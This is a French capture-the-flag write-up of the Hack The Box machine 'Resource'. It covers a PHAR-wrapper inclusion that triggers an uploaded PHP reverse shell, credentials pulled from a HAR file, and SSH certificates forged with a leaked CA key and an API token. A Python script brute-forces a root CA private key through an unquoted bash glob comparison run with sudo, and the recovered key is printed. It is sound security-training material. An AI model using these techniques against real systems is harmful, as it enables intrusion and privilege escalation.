---
date: 2024-11-22T18:48:22-06:00
# description: ""
image: "/images/HTB-Resource/Resource.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Resource"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Resource](https://app.hackthebox.com/machines/Resource)
* Niveau: Difficile
* OS: Linux
---

Resource met l'accent sur l'exploitation des fichiers SSH et des certificats d'autorité. L'accès initial est obtenu via une attaque de désérialisation PHAR ciblant une fonctionnalité de téléchargement de fichiers. Ensuite, des identifiants d'utilisateur sont extraits d'un fichier HAR, permettant de progresser vers un autre utilisateur. La découverte de clés d'autorité de certification nous permet de générer des clés SSH pour accéder à un troisième utilisateur. Enfin, une vulnérabilité d'injection de globes dans un script bash est exploitée pour élever nos privilèges et obtenir l'accès root sur un hôte différent.

Adresse IP cible - `10.10.11.27`

## Balayage

```
./nmap_scan.sh 10.10.11.27 Resource
```

**Résultats**

```shell
Running detailed scan on open ports: 22,80,2222
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 18:47 CST
Nmap scan report for 10.10.11.27
Host is up (0.060s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 78:1e:3b:85:12:64:a1:f6:df:52:41:ad:8f:52:97:c0 (ECDSA)
|_  256 e1:1a:b5:0e:87:a4:a1:81:69:94:9d:d4:d4:a3:8a:f9 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://itrc.ssg.htb/
2222/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA)
|_  256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds
```

La cible utilise deux versions différentes de SSH: 9.2p1 sur le port 22 et 8.9p1 sur le port 2222. Elle a aussi un serveur web (HTTP) fonctionnant sur le port 80 avec une redirection vers `http://itrc.ssg.htb/` que nous ajoutons au fichier `etc/hosts`.

```
sudo echo "10.10.11.27 itrc.ssg.htb" | sudo tee -a /etc/hosts
```

## Enumération

Nous trouvons un site web pour un centre de ressources à `http://itrc.ssg.htb/` avec une fonction d'authentification.

![Resource website](/images/HTB-Resource/resource-website.png)

Après s'être connecté avec notre compte nouvellement créé, nous pouvons soumettre un nouveau ticket à `http://itrc.ssg.htb/?page=dashboard`.

![Ticekts list](/images/HTB-Resource/dashboard-page.png)

En cliquant sur `New Ticket`, on accède à `http://itrc.ssg.htb/?page=create_ticket`.

![New ticket creation](/images/HTB-Resource/create_ticket.png)

Deux choses sont à noter ici :
- le paramètre `?page` pourrait être vulnérable à la LFI 
- nous pourrions être en mesure de contourner les restrictions de la fonction de téléchargement et de télécharger un shell inversé.

Créons un ticket et téléchargeons un fichier zip aléatoire pour observer le fonctionnement de l'application.

![file upload test](/images/HTB-Resource/test_zip.png)

En cliquant sur un ticket spécifique, nous obtenons plus d'informations.

![upload folder](/images/HTB-Resource/uploads_folder.png)

En survolant notre fichier, nous découvrons qu'il est stocké dans le répertoire `/uploads`. Avec Wappalyzer nous réalisons que nous avons affaire à une application PHP, essayons d'uploader un reverse shell PHP.

![wappalyzer](/images/HTB-Resource/wappalyzer.png)

Sur [revshells](https://www.revshells.com/) nous pouvons utiliser le shell `PHP Ivan Sincek` pour créer un fichier zip et l'uploader sur la cible.

![reverse shell zip](/images/HTB-Resource/php_revshell_zip.png)

![reverse shell upload](/images/HTB-Resource/revshell_php.png)

Les url `http://itrc.ssg.htb/?page=/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php` et `http://itrc.ssg.htb/uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell.php` ne parviennent pas à déclencher le reverse shell, nous devons donc trouver un autre moyen d'exécuter notre fichier.

![reverse shell trigger failure](/images/HTB-Resource/revshell_fail.png)

## Accès initial

Après quelques recherches, nous découvrons l'attaque de désérialisation PHAR (PHP Archive) expliquée [ici](https://book.hacktricks.xyz/pentesting-web/file-inclusion/phar-deserialization) et [ici](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability).

> Lorsque nous créons une archive `.zip` contenant le fichier `revshell.php` et que nous y accédons en utilisant le wrapper `phar://`, PHP traite le fichier `.zip` comme une archive compatible PHAR. Le protocole `phar://` permet à PHP d'accéder directement aux fichiers de l'archive, y compris les scripts PHP exécutables. Lorsque l'URL `http://itrc.ssg.htb/?page=phar://uploads/.../revshell` est utilisée, le serveur exécute le fichier `revshell.php` dans l'archive en tant que code PHP, déclenchant ainsi le reverse shell. Cette opération fonctionne parce que le serveur utilise un mécanisme d'inclusion de fichier non sécurisé (`include`, `require`, ou similaire) sans valider ou restreindre correctement le chemin d'accès au fichier.

En utilisant `http://itrc.ssg.htb/?page=phar://uploads/9870e12def3a5dbd118d0a66164fd72036d08d4e.zip/revshell` nous déclenchons avec succès le reverse shell. Nous obtenons une connexion sur notre listener en tant que `www-data` et nous sommes dans `/var/www/itrc`.

![phar reverse shell](/images/HTB-Resource/phar_revshell.png)

![foothold](/images/HTB-Resource/foothold.png)

Dans le répertoire `uploads` nous trouvons de nombreuses archives ZIP, nous n'en avons personnellement téléchargé que deux, voyons donc ce que contiennent les autres.

![application upload directory](/images/HTB-Resource/uploads_folder_ontarget.png)

![upload directory content](/images/HTB-Resource/upload_directory_content.png)

Nous exécutons la commande ci-dessous pour extraire toutes les archives du dossier.

```
for file in *.zip; do unzip "$file"; done
```

![bulk extraction](/images/HTB-Resource/bulk_extraction.png)

Après l'extraction, nous récupérons quelques clés publiques (pour les algorithmes Ed25519 et RSA), un fichier `.har` et les fichiers que nous avons précédemment téléchargés.

> Un fichier `.HAR` (HTTP Archive) est un format de fichier utilisé pour enregistrer les détails des échanges HTTP entre un client (généralement un navigateur web) et un serveur.

![files after extraction](/images/HTB-Resource/files_after_extraction.png)

### Shell en tant que msainristil (sur l'hôte itrc)

Nous trouvons deux utilisateurs sur le système: `msainristil` et `zzinter`. En utilisant `cat itrc.ssg.htb.har | grep msainristil` nous récupérons des identifiants qui sont `msainristil:82yards2closeit`.

![user list](/images/HTB-Resource/user_list.png)

![msainristil credentials](/images/HTB-Resource/msainristil_creds.png)

Nous nous connectons via SSH avec les informations d'identification obtenues, mais nous ne trouvons pas de drapeau utilisateur, mais des fichiers liés à un certificat d'autorité. 

`ca-itrc` et `ca-itrc.pub` sont très probablement les clés privée et publique d'une autorité de certification utilisée pour signer des certificats, qui peuvent inclure des clés SSH ou d'autres types de certificats.

![CA files](/images/HTB-Resource/msainristil_files.png)

### Shell en tant que zzinter (sur l'hôte itrc)

Puisque nous avons accès à la clé privée du CA, nous pouvons créer une clé SSH pour nous connecter en tant que `zzinter`.

1. Créer une paire de clés SSH pour zzinter.

```
ssh-keygen -t rsa -b 4096 -f id_rsa_zzinter
```

| Command/Options   | Description                                                     |
| ----------------- | --------------------------------------------------------------- |
| ssh-keygen        | Outil de ligne de commande utilisé pour générer des clés SSH.                    |
| -t rsa            | Spécifie le type de clé à créer (paire de clés RSA dans notre cas). |
| -b 4096           | Longueur des bits, notre clé RSA aura une longueur de 4096 bits.        |
| -f id_rsa_zzinter | Spécifie le nom du fichier.                                           |


![zzinter keys](/images/HTB-Resource/zzinter_keys.png)

2. Créez le certificat SSH pour zzinter.

```
ssh-keygen -s ca-itrc -I zzinter_key_id -n zzinter -V +52w id_rsa_zzinter.pub
```

| Command/Options    | Description                                                    |
| ------------------ | -------------------------------------------------------------- |
| -s ca-itrc         | Chemin d'accès à la clé privée de l'autorité de certification.                                  |
| -I zzinter_key_id  | Identifiant unique pour le certificat (vous pouvez choisir n'importe quel nom). |
| -n zzinter         | Le principal (utilisateur) pour lequel le certificat est valide.       |
| -V +52w            | Définit la période de validité (ici 52 semaines).                          |
| id_rsa_zzinter.pub | La clé publique que nous signons.                                  |

![zzinter SSH certificate](/images/HTB-Resource/zzinter_SSH_certificate.png)

3. Se connecter à l'aide de la clé SSH.

```
ssh -i id_rsa_zzinter zzinter@itrc.ssg.htb
```

![zzinter SSH login](/images/HTB-Resource/zzinter_login.png)

Ci-dessous se trouve le contenu du script `sign_key_api.sh`. Il automatise le processus de soumission d'une clé publique SSH au service de signature `signserv.ssg.htb` pour générer un certificat SSH signé pour un utilisateur donné.

```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <public_key_file> <username> <principal>"
    exit 1
}

if [ "$#" -ne 3 ]; then
    usage
fi

public_key_file="$1"
username="$2"
principal_str="$3"

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

public_key=$(cat $public_key_file)

curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

Utilisons le même processus que précédemment pour créer une clé SSH pour root, et voyons si nous y trouvons quelque chose d'intéressant.

```
ssh-keygen -t rsa -b 4096 -f id_rsa_root
ssh-keygen -s ca-itrc -I root_key_id -n root -V +52w id_rsa_root.pub
ssh -i id_rsa_root root@itrc.ssg.htb
```

Malheureusement, le compte root est vide, mais nous remarquons une adresse IP différente mentionnée (`172.223.0.3`). Cela signifie probablement que nous sommes à l'intérieur d'un conteneur dont nous devons sortir.

![root SSH login](/images/HTB-Resource/root_ssh.png)

### Shell en tant que support (sur l'hôte ssg)

Le script contient une liste d'utilisateurs valides, nous allons donc utiliser l'un d'entre eux.

1. Générer une clé SSH pour `support`.

```
ssh-keygen -t rsa -b 4096 -f id_rsa_support
```

2. Nous utilisons le script pour générer un certificat SSH signé.

```
bash ./sign_key_api.sh id_rsa_support.pub support support
```

* Vous recevrez le certificat SSH en format OpenSSH. Nous utilisons `echo "YOUR_SSH_CERTIFICATE" > id_rsa_support-cert.pub` pour le stocker dans un fichier car nous n'avons pas accès à un éditeur de texte.

![support SSH certificate](/images/HTB-Resource/support_ssh_cert.png)

3. Modifier les permissions des fichiers

```
chmod 600 id_rsa_support
chmod 600 id_rsa_support-cert.pub
```

4. Se connecter via SSH

```
ssh -i id_rsa_support -p 2222 support@172.223.0.1
```

![root SSH login](/images/HTB-Resource/support_ssh_login.png)

Le nom d'hôte de notre précédente session SSH (avec root) était `itrc`, maintenant nous sommes connectés en tant que `support` et le nom d'hôte est `ssg`. Le dossier personnel de `support` est vide, et `etc/passwd` montre que `zzinter` est aussi un utilisateur ici.

![zzinter user on ssg host](/images/HTB-Resource/zzinter_ssg_host.png)

### Shell en tant que zzinter (sur l'hôte ssg)

Nous allons répéter le même processus et nous connecter en tant que `zzinter` sur le nouvel hôte. Le problème ici est que nous ne pouvons pas générer un certificat signé en utilisant le script parce que `zzinter` n'est pas un principal supporté. 

En examinant à nouveau le script, nous voyons qu'il utilise `curl` pour récupérer le certificat SSH, la requête nécessite trois informations: une clé publique, un nom d'utilisateur, et un ou plusieurs utilisateur(s). Actuellement, nous n'avons pas de nom d'utilisateur valide.

```
curl -s signserv.ssg.htb/v1/sign -d '{"pubkey": "'"$public_key"'", "username": "'"$username"'", "principals": "'"$principal"'"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

Le contenu de `/etc/ssh/sshd_config.d/sshcerts.conf` nous montre qu'un fichier situé dans `/etc/ssh/auth_principals` est utilisé par SSH sur cet hôte. En vérifiant le fichier, nous trouvons que `zzinter_temp` est un nom valide pour `zzinter`.

![SSH principal file](/images/HTB-Resource/principal_file.png)

![zzinter valid principal name](/images/HTB-Resource/zzinter_temp.png)

Avec tous les éléments nécessaires, nous pouvons maintenant répéter le processus utilisé précédemment.

1. Générer une clé SSH pour zzinter.

```
ssh-keygen -t rsa -b 4096 -f id_rsa_zzinter
```

2. Pour obtenir notre certificat signé, nous envoyons une requête avec curl.

```
curl signserv.ssg.htb/v1/sign -d '{"pubkey": "YOUR_GENERATED_PUBLIC_KEY", "username": "zzinter", "principals": "zzinter_temp"}' -H "Content-Type: application/json" -H "Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE"
```

* Stocker le certificat dans un fichier.

```
echo "YOUR_SSH_CERTIFICATE" > id_rsa_zzinter-cert.pub
```

3. Modifier les permissions des clés.

```
chmod 600 id_rsa_zzinter
chmod 600 id_rsa_zzinter-cert.pub
```

4. Connectez-vous en tant que `zzinter` sur le nouvel hôte.

```
ssh -i id_rsa_zzinter -p 2222 zzinter@172.223.0.1
```

![zzinter ssh login on ssg host](/images/HTB-Resource/zzinter_ssh_ssg_host.png)

## Elévation de Privilèges - Shell en tant que root (sur l'hôte ssg)

Le dossier personnel de `zzinter` ne contient que le drapeau de utilisateur, mais avec `sudo -l` nous apprenons que cet utilisateur peut exécuter `/opt/sign_key.sh` en tant que root sans fournir de mot de passe.

![sudo -l command](/images/HTB-Resource/sudo-l-cmd.png)

Vous trouverez ci-dessous le contenu de `sign_key.sh`. Le script est similaire au script `sign_key_api.sh`, il utilise `ssh-keygen` pour signer une clé publique SSH en utilisant la clé privée de l'autorité de certification spécifiée pour créer un certificat SSH signé. Il attend cinq arguments et effectue également une opération de comparaison avec le fichier `/etc/ssh/ca-it`.

```bash
#!/bin/bash

usage () {
    echo "Usage: $0 <ca_file> <public_key_file> <username> <principal> <serial>"
    exit 1
}

if [ "$#" -ne 5 ]; then
    usage
fi

ca_file="$1"
public_key_file="$2"
username="$3"
principal_str="$4"
serial="$5"

if [ ! -f "$ca_file" ]; then
    echo "Error: CA file '$ca_file' not found."
    usage
fi

itca=$(cat /etc/ssh/ca-it)
ca=$(cat "$ca_file")
if [[ $itca == $ca ]]; then
    echo "Error: Use API for signing with this CA."
    usage
fi

if [ ! -f "$public_key_file" ]; then
    echo "Error: Public key file '$public_key_file' not found."
    usage
fi

supported_principals="webserver,analytics,support,security"
IFS=',' read -ra principal <<< "$principal_str"
for word in "${principal[@]}"; do
    if ! echo "$supported_principals" | grep -qw "$word"; then
        echo "Error: '$word' is not a supported principal."
        echo "Choose from:"
        echo "    webserver - external web servers - webadmin user"
        echo "    analytics - analytics team databases - analytics user"
        echo "    support - IT support server - support user"
        echo "    security - SOC servers - support user"
        echo
        usage
    fi
done

if ! [[ $serial =~ ^[0-9]+$ ]]; then
    echo "Error: '$serial' is not a number."
    usage
fi

ssh-keygen -s "$ca_file" -z "$serial" -I "$username" -V -1w:forever -n "$principal" "$public_key_file"
```

Après avoir examiné attentivement le script, nous découvrons une vulnérabilité: le côté droit de l'opération de correspondance `[[ $itca == $ca ]]` n'est pas entre guillemets, ce qui le rend vulnérable aux attaques par force brute. Sans ces guillemets, Bash effectue un "pattern matching" au lieu d'interpréter les données comme une chaîne de caractères.

Par exemple, si nous avons une opération de recherche de mot de passe avec `[[$DB_PASS == mystrongpassword]]`, la saisie de `mys*` sera évaluée à `vrai` parce que c'est un pattern global correspondant à n'importe quelle chaîne commençant par ces trois lettres. De même, dans le script `sign_key.sh`, la ligne `[[ $itca == $ca ]]` compare les deux chaînes sans les guillemets, ce qui nous permet de reconstruire le contenu de la clé du CA (Autorité de Certification) de manière progressive, un caractère à la fois. Nous utilisons le script ci-dessous pour récupérer la clé.

> Dans `etc/ssh/auth_principals/root` nous trouvons que le nom de principal valide pour root est `root_user`.

```python
import subprocess

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\n "

discovered_ca = "-----BEGIN OPENSSH PRIVATE KEY-----\n"

temp_ca_file = "temp_ca_guess"

while True:
    found_character = False

    for char in charset:
        current_guess = discovered_ca + char + "*"
        with open(temp_ca_file, "w") as f:
            f.write(current_guess)
        
        result = subprocess.run(
            ["sudo", "/opt/sign_key.sh", temp_ca_file, "test.pub", "root", "root_user", "1"],
            stdout=subprocess.PIPE,
            text=True
        )
        
        if "Use API for signing with this CA" in result.stdout:
            # Correct character found, append to discovered_ca
            discovered_ca += char
            print(f"[+] Discovered so far: {discovered_ca}")
            found_character = True
            break  # Break inner loop to continue building the CA string
    
    if not found_character:
        if "-----END OPENSSH PRIVATE KEY-----" in discovered_ca:
            print(f"[!] Full CA content discovered:\n{discovered_ca}")
        else:
            print(f"[!] Script terminated prematurely. Partial CA content:\n{discovered_ca}")
        break
```

Après avoir exécuté le script, nous récupérons la clé et la sauvegardons dans un fichier (que j'ai nommé `root.key` dans mon cas).

> Nous devons ajouter manuellement `-----END OPENSSH PRIVATE KEY-----` à la clé.

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQAAAKg7BlysOwZc
rAAAAAtzc2gtZWQyNTUxOQAAACCB4PArnctUocmH6swtwDZYAHFu0ODKGbnswBPJjRUpsQ
AAAEBexnpzDJyYdz+91UG3dVfjT/scyWdzgaXlgx75RjYOo4Hg8Cudy1ShyYfqzC3ANlgA
cW7Q4MoZuezAE8mNFSmxAAAAIkdsb2JhbCBTU0cgU1NIIENlcnRmaWNpYXRlIGZyb20gSV
QBAgM=
-----END OPENSSH PRIVATE KEY-----
```

![CA content](/images/HTB-Resource/CA_content.png)

Nous pouvons retourner sur notre machine locale et générer des clés SSH pour root.

1. Générer une paire de clés pour root.

```
ssh-keygen -f root
```

2. Modifier l'autorisation de la clé récupérée.

```
chmod 600 root.key
```

3. Créez un certificat SSH en signant la clé publique.

```
ssh-keygen -s root.key -z 200 -I root -V -52w:forever -n root_user root.pub
```

| Option          | Description                                                                                                                                      |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| -s root.key     | Spécifie la clé de signature, qui est la clé privée de l'autorité de certification (CA).                                                           |
| -z 200          | Indique le numéro de série du certificat. Il s'agit d'un identifiant unique pour le certificat.   |
| -I root         | Spécifie l'identité de la clé. L'identité (`root`) est un label arbitraire pour le certificat.                                               |
| -V -52w:forever | Spécifie la période de validité.                                                                                                                   |
| -n root_user    | Spécifie les principaux autorisés (noms d'utilisateur ou rôles).           |
| root.pub        | Spécifie le fichier de clé publique à signer. Le certificat sera généré pour cette clé, et le fichier résultant sera nommé `root-cert.pub`. |

4. Se connecter en tant que root 

```
ssh root@itrc.ssg.htb -p2222 -i root -i root-cert.pub
```

> La clé privée (`root`) fournit une preuve de propriété, tandis que le certificat (`root-cert.pub`) établit la confiance entre notre clé et le serveur. Le serveur valide le certificat en utilisant la clé publique de l'autorité de certification stockée dans sa configuration (dans `TrustedUserCAKeys`), et utilise ensuite la clé privée pour compléter le processus d'authentification. Le certificat indique au serveur de faire confiance à la clé publique `root.pub` parce qu'elle a été signée par l'autorité de certification (CA) de confiance. Sans le certificat, le serveur ne reconnaîtrait pas la clé comme une identité de confiance.

![root ssh login and flag](/images/HTB-Resource/root_flag.png)

Merci d'avoir lu cet article! Si vous avez des questions, vous pouvez me contacter sur [X](https://x.com/_KScorpio).
